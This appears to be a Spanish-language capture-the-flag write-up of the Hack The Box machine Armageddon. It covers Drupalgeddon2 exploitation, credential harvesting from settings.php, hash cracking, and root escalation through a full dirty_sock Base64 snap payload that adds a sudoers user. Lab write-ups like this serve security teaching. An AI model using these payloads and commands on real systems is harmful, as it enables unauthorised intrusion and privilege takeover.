<!DOCTYPE html><html lang="es" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="días antes"><meta name="hour-prompt" content="horas antes"><meta name="minute-prompt" content="minutos antes"><meta name="justnow-prompt" content="justo ahora"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Armageddon (Hack The Box)" /><meta name="author" content="J0lm3d0" /><meta property="og:locale" content="es" /><meta name="description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina Armageddon de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma." /><meta property="og:description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina Armageddon de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma." /><link rel="canonical" href="https://j0lm3d0.github.io/posts/armageddon-(hack-the-box)/" /><meta property="og:url" content="https://j0lm3d0.github.io/posts/armageddon-(hack-the-box)/" /><meta property="og:site_name" content="J0lm3d0" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-24T21:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Armageddon (Hack The Box)" /><meta name="twitter:site" content="@J0lm3d0" /><meta name="twitter:creator" content="@J0lm3d0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J0lm3d0"},"dateModified":"2021-07-24T21:00:00+02:00","datePublished":"2021-07-24T21:00:00+02:00","description":"En este documento se recogen los pasos a seguir para la resolución de la máquina Armageddon de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.","headline":"Armageddon (Hack The Box)","mainEntityOfPage":{"@type":"WebPage","@id":"https://j0lm3d0.github.io/posts/armageddon-(hack-the-box)/"},"url":"https://j0lm3d0.github.io/posts/armageddon-(hack-the-box)/"}</script><title>Armageddon (Hack The Box) | J0lm3d0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="J0lm3d0"><meta name="application-name" content="J0lm3d0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="es"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://cdna.artstation.com/p/assets/images/images/022/342/774/large/nikita-poghainyi-viber-2019-08-04-15-41-05.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">J0lm3d0</a></div><div class="site-subtitle font-italic">CTF Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>HISTÓRICO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/J0lm3d0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/J0lm3d0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/j0lm3d0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Armageddon (Hack The Box)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Armageddon (Hack The Box)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> J0lm3d0 </span> - <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="24 Jul 2021, 21:00" >24 Jul 2021<i class="unloaded">2021-07-24T21:00:00+02:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1535 palabras">8 minutos de lectura</span></div></div><div class="post-content"><p>En este documento se recogen los pasos a seguir para la resolución de la máquina Armageddon de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Armageddon/machine.png" alt="Logo de la máquina" /></p><p><a href="/pdfs/Write_up_Armageddon.pdf">Write-up en PDF realizado mediante LaTeX</a></p><h2 id="enumeración-de-servicios-y-recopilación-de-información-sensible">Enumeración de servicios y recopilación de información sensible</h2><p>Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c"># nmap -p- --open -T5 -n -vv 10.10.10.233</span>

Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

</pre></table></code></div></div><p>Una vez que enumero los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c"># nmap -p 22,80 -sC -sV 10.10.10.233</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span class="o">(</span>RSA<span class="o">)</span>
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
</pre></table></code></div></div><p>Los scripts de <code class="language-plaintext highlighter-rouge">Nmap</code> me muestran algunas cosas interesantes, como el servidor web utilizado (Apache 2.4.6), la versión de PHP y que se emplea un gestor de contenidos <code class="language-plaintext highlighter-rouge">Drupal</code> (versión 7). También me indica algunas rutas deshabilitadas en el fichero <code class="language-plaintext highlighter-rouge">robots.txt</code>. Al tratarse de un gestor de contenidos Drupal, consigo enumerar la versión exacta accediendo al fichero <code class="language-plaintext highlighter-rouge">CHANGELOG.txt</code>, donde nos aparece el listado de cambios de la última versión instalada y de las versiones anteriores.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># curl http://10.10.10.233/CHANGELOG.txt</span>

Drupal 7.56, 2017-06-21
<span class="nt">-----------------------</span>
- Fixed security issues <span class="o">(</span>access bypass<span class="o">)</span><span class="nb">.</span> See SA-CORE-2017-003.
</pre></table></code></div></div><p>Con esta versión de Drupal y la pista que ofrece el nombre de la máquina (Armageddon), el primer vector de ataque que se me ocurre probar es el exploit <code class="language-plaintext highlighter-rouge">Drupalgeddon2</code>, que consiste en una Ejecución Remota de Código (RCE) sin necesidad de autenticarnos en el gestor de contenido. Al buscar en <code class="language-plaintext highlighter-rouge">SearchSploit</code>, encuentro 3 exploits correspondientes a Drupalgeddon2, 2 escritos en Ruby (uno de ellos para Metasploit) y 1 escrito en Python.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Armageddon/searchsploit.png" alt="Búsqueda de exploits para la versión de Drupal" /></p><p>Probare primero con el script en Ruby, cuyo identificador en Exploit-DB es 44449.</p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Tras ejecutar el script y pasarle como argumento la URL del servidor vulnerable, consigo conectarme a la máquina víctima como el usuario <code class="language-plaintext highlighter-rouge">apache</code>. El script simula una shell, aunque se trata de una fake-shell, ya que lo que hace es subir un archivo PHP malicioso al servidor y tramitar una petición HTTP con cada comando que recibe.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Armageddon/drupalgeddon2.png" alt="Ejecución del exploit y conexión a la máquina víctima" /></p><p>Una vez dentro de la máquina víctima, me envío una shell a mi máquina de atacante utilizando algunas sentencias de Python3, para así trabajar de una forma más cómoda en la escalada de privilegios.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Armageddon/revshell.png" alt="Envío de una shell mediante Python3 a la máquina atacante" /></p><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><h3 id="usuario-brucetherealadmin">Usuario brucetherealadmin</h3><p>Una vez obtengo la reverse shell, me pongo a buscar dentro del directorio del servidor web archivos de configuración en PHP, ya que estos pueden contener credenciales en texto claro. En mi caso, utilizaré <code class="language-plaintext highlighter-rouge">Grep</code> para filtrar por ficheros o directorios que contengan las palabras “config” o “settings” en el nombre..</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span>find <span class="nb">.</span> | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"config|settings"</span>

./misc/configure.png
./modules/update/update.settings.inc
./sites/default/default.settings.php
./sites/default/settings.php
./themes/garland/theme-settings.php
./web.config
./.editorconfig
</pre></table></code></div></div><p>De los resultados obtenidos, el que más me llama la atención es el fichero “settings.php”. Al abrir el archivo y buscar en él, visualizo la siguiente estructura, correspondiente a las credenciales de una base de datos local:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>$databases = array (
  'default' =&gt; 
  array (
    'default' =&gt; 
    array (
      'database' =&gt; 'drupal',
      'username' =&gt; 'drupaluser',
      'password' =&gt; 'CQHEy@9M*m23gBVj',
      'host' =&gt; 'localhost',
      'port' =&gt; '',
      'driver' =&gt; 'mysql',
      'prefix' =&gt; '',
    ),
  ),
);
</pre></table></code></div></div><p>Con esas credenciales, utilizo la interfaz de línea de comandos de <code class="language-plaintext highlighter-rouge">MySQL</code> para intentar acceder a la base de datos y ver su contenido. En primer lugar, listo las tablas que componen la base de datos “drupal” y que tengan contenido relativo a los usuarios, filtrando con \textbf{\textsl{Grep}} por las palabras “user” y “pass”.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ mysql -udrupaluser -pCQHEy@9M*m23gBVj -e "SHOW TABLES FROM drupal;" | grep -i -E "user|pass"

shortcut_set_users
users
users_roles
</pre></table></code></div></div><p>De las tablas que he obtenido, la que más me interesa es la de “users”. Si utilizamos la sentencia <code class="language-plaintext highlighter-rouge">describe</code> podemos ver los campos que componen la tabla, siendo uno de ellos el campo “pass”.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>$ mysql -udrupaluser -pCQHEy@9M*m23gBVj -D drupal -e "describe users;"

Field   Type    Null    Key     Default Extra
uid     int(10) unsigned        NO      PRI     0
name    varchar(60)     NO      UNI
pass    varchar(128)    NO
mail    varchar(254)    YES     MUL
theme   varchar(255)    NO
signature       varchar(255)    NO
signature_format        varchar(255)    YES             NULL
created int(11) NO      MUL     0
access  int(11) NO      MUL     0
login   int(11) NO              0
status  tinyint(4)      NO              0
timezone        varchar(32)     YES             NULL
language        varchar(12)     NO
picture int(11) NO      MUL     0
init    varchar(254)    YES
data    longblob        YES             NULL
</pre></table></code></div></div><p>Por tanto, utilizo la sentencia <code class="language-plaintext highlighter-rouge">select</code> para obtener los nombres de usuario y sus respectivas contraseñas, obteniendo el siguiente resultado:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$ mysql -udrupaluser -pCQHEy@9M*m23gBVj -D drupal -e "select name,pass from users;"  

name                    pass
brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
toto	$S$DpBGzyo25xGDy9fKxiOQ.Qp/Y716KreJLZ5sW/adVr99WCN2K3AV
random	$S$DBlsy3rYceP/vtBmjPflw0jnwi9vYFCKhuBx0JcrQUm5i2ugImRu
randome	$S$Df0VDlr2RgxhVNFbaRG8FbANcoT.tR18/Z/J0MepSSvMXJ0a7i9X
random0	$S$DAfuci2ClSJhWWxqc96cWSXyjJHh5blq0nwIk1DpfoSSnB705xLW
</pre></table></code></div></div><p>De estos usuarios, los que más me interesan son “brucetherealadmin” y “toto”, ya que los otros son usuarios aleatorios creados. Tras una rápida revisión del fichero <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la máquina, veo que “brucetherealadmin” es un usuario existente en el sistema Linux, por lo que me centrare primero en este usuario.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ cat /etc/passwd | grep "sh$"

root:x:0:0:root:/root:/bin/bash
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
</pre></table></code></div></div><p>Copio el hash de la contraseña que hemos obtenido a un fichero y aplico un ataque de fuerza bruta con <code class="language-plaintext highlighter-rouge">John The Ripper</code> para intentar obtener la contraseña en texto claro.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre># john --wordlist=/usr/share/wordlists/rockyou.txt brucetherealadmin_hash

Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
</pre></table></code></div></div><p>Con la contraseña obtenida me conecto mediante el servicio SSH y visualizo la flag de usuario en la máquina víctima.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre># ssh -l brucetherealadmin 10.10.10.233
brucetherealadmin@10.10.10.233's password: 

Last failed login: Thu Apr 15 11:35:07 BST 2021 from 10.10.14.33 on ssh:notty
There was 1 failed login attempt since the last successful login.
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5

[brucetherealadmin@armageddon ~]$ cat user.txt 
9557c1e1d13935db03272b8dc6f9bca3
</pre></table></code></div></div><h3 id="usuario-administrador-root">Usuario administrador (root)</h3><p>Una vez que he conseguido escalar privilegios al usuario “brucetherealadmin”, debo seguir escalando hasta llegar a ser administrador o root. Con el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> compruebo si puede ejecutarse algún archivo con privilegios de otro usuario o sin proporcionar contraseña. En este caso, se puede ejecutar <code class="language-plaintext highlighter-rouge">snap install</code> seguido de cualquier argumento como el usuario “root” y sin proporcionar contraseña.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>

Matching Defaults entries <span class="k">for </span>brucetherealadmin on armageddon:
    <span class="o">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>,
    env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>,
    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/snap <span class="nb">install</span> <span class="k">*</span>
</pre></table></code></div></div><p>Investigando por internet formas de escalar privilegios mediante <code class="language-plaintext highlighter-rouge">Snap</code>, encuentro el exploit <code class="language-plaintext highlighter-rouge">dirty\_sock</code> en ExploitDB. Tras observar el exploit veo que, mediante un payload codificado en Base64 crea un fichero .snap malicioso que, al instalarlo, creará un usuario “dirty_sock” que estará dentro del grupo <code class="language-plaintext highlighter-rouge">sudo</code>, por lo que puedo convertirme en root ejecutando un <code class="language-plaintext highlighter-rouge">sudo su</code> y proporcionando la contraseña del nuevo usuario creado.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Armageddon/dirtysockpayload.png" alt="Payload del exploit Dirty Sock" /></p><p>Por tanto, creo un fichero con el contenido del payload decodificado y ejecuto el comando <code class="language-plaintext highlighter-rouge">snap install</code> con la flag “devmode” y pasandole el archivo .snap malicioso como argumento.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span>python2 <span class="nt">-c</span> <span class="s2">"print ('''aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''+'A'*4256+'==')"</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> dirty.snap

<span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/snap <span class="nb">install</span> <span class="nt">--devmode</span> dirty.snap
dirty-sock 0.1 installed
</pre></table></code></div></div><p>Tras esto, el usuario “dirty_sock” está creado y puedo migrarme a él proporcionando la contraseña, que también es “dirty_sock”. Por último, ejecuto un <code class="language-plaintext highlighter-rouge">sudo su</code> y vuelvo a proporcionar la contraseña del usuario “dirty_sock”, convirtiéndome así en root y pudiendo visualizar la flag final.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span>su dirty_sock
Password: dirty_sock
<span class="o">[</span>dirty_sock@armageddon ~]<span class="nv">$ </span><span class="nb">sudo </span>su

We trust you have received the usual lecture from the <span class="nb">local </span>System
Administrator. It usually boils down to these three things:

    <span class="c">#1) Respect the privacy of others.</span>
    <span class="c">#2) Think before you type.</span>
    <span class="c">#3) With great power comes great responsibility.</span>

<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>dirty_sock: dirty_sock

<span class="o">[</span>root@armageddon ~]#cat root.txt 
13a2e1f5a9e7946e71b640a533c676e5
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/drupal/" class="post-tag no-text-decoration" >drupal</a> <a href="/tags/drupalgeddon/" class="post-tag no-text-decoration" >drupalgeddon</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a> <a href="/tags/snap/" class="post-tag no-text-decoration" >snap</a> <a href="/tags/dirty-sock/" class="post-tag no-text-decoration" >dirty_sock</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Armageddon (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/armageddon-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Armageddon (Hack The Box) - J0lm3d0&u=https://j0lm3d0.github.io/posts/armageddon-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Armageddon (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/armageddon-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', '¡Enlace copiado correctamente!')" data-toggle="tooltip" data-placement="top" title="Copiar enlace"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Actualizado recientemente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/tier-0-starting-point-machines-(hack-the-box)/">Tier 0 Starting Point Machines (Hack The Box)</a><li><a href="/posts/previse-(hack-the-box)/">Previse (Hack The Box)</a><li><a href="/posts/couch-(try-hack-me)/">Couch (Try Hack Me)</a><li><a href="/posts/knife-(hack-the-box)/">Knife (Hack The Box)</a><li><a href="/posts/pentesting_shells_cheat_sheet_script/">Pentesting_Shells-Cheat_Sheet-Script</a></ul></div><div id="access-tags"> <span>Etiquetas en tendencia</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contenidos</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 